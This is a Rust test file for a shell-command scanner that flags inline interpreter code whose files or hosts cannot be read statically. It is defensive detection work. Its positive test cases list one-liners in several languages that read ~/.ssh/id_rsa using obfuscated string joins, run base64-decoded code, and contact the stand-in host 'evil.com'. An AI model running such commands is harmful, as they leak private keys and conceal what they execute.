//! Inline code whose files, hosts or variables the scan cannot read is
//! `@opaque-code <interpreter>` (`commands/payload/opaque.rs`).

use super::parsed;
use crate::action::AtomicAction;

fn opaque(cmd: &str) -> bool {
    parsed(cmd).iter().any(|atom| {
        matches!(atom, AtomicAction::Shell { argv } if argv.first().is_some_and(|a| a == "@opaque-code"))
    })
}

#[test]
fn code_that_builds_the_name_it_opens_is_opaque() {
    for cmd in [
        r#"python3 -c 'import os;print(open(os.path.expanduser("~/.s"+"sh/id_rsa")).read())'"#,
        r#"node -e "console.log(require('fs').readFileSync(process.env.HOME+'/.ss'+'h/id_rsa','utf8'))""#,
        r#"perl -e 'open F,"$ENV{HOME}/.s"."sh/id_rsa";print <F>'"#,
        r#"python3 -c 'p="~/.s" "sh/id_rsa"; print(open(p).read())'"#,
        r#"python3 -c 'import os; print(open(f"{os.environ[\"HOME\"]}/.ssh/id_rsa").read())'"#,
        r#"python3 -c 'import os; print(open(os.path.join(os.environ["HOME"], ".ssh", "id_rsa")).read())'"#,
        r#"python3 -c 'import base64;exec(base64.b64decode("cHJpbnQoMSk="))'"#,
        r#"python3 -c 'import urllib.request as u; u.urlopen("http://e"+"vil.com")'"#,
        r"node -e 'fetch(`https://${process.env.H}/x`)'",
        r#"ruby -e 'puts File.read(ENV["HOME"] + "/.ssh/id_rsa")'"#,
        r#"php -r 'echo file_get_contents(getenv("HOME")."/.ssh/id_rsa");'"#,
        r#"perl -e 'open(my $f, "<", $ARGV[0]); print <$f>' x"#,
        r#"python3 -c 'import subprocess; subprocess.run(["c"+"at", "x"])'"#,
        "python3 - <<'EOF'\nimport os\nprint(open(os.path.expanduser('~/.s' + 'sh/id_rsa')).read())\nEOF",
    ] {
        assert!(opaque(cmd), "{cmd}: {:?}", parsed(cmd));
    }
}

#[test]
fn trivial_and_literal_code_is_not_opaque() {
    for cmd in [
        "python3 -c 'print(1+1)'",
        "python3 -c 'print(\"a\" + \"b\")'",
        "node -e 'console.log(2)'",
        "node -e \"console.log(process.argv)\"",
        "node -e 'console.log(process.env.NODE_ENV)'",
        "python3 -c 'import json,sys; json.load(sys.stdin)'",
        "python3 -c \"import os;print(os.getcwd())\"",
        "python3 -c \"import os;print(os.environ['HOME'])\"",
        "python3 -c \"import os;print(getattr(os,'sep'))\"",
        "python3 -c \"import os,subprocess;subprocess.run(['ls'],env={**os.environ,'A':'1'})\"",
        "python3 -c \"import tomllib; print(tomllib.load(open('pyproject.toml','rb'))['project']['version'])\"",
        "ruby -e 'puts File.read(\"Gemfile\")'",
        "node -e \"console.log(require('./package.json').version)\"",
        "python3 -c 'import sys; print(sys.version)'",
        "perl -e 'print \"hello\\n\"'",
        "perl -pi -e 's/foo/bar/' x.txt",
    ] {
        assert!(!opaque(cmd), "{cmd}: {:?}", parsed(cmd));
    }
}
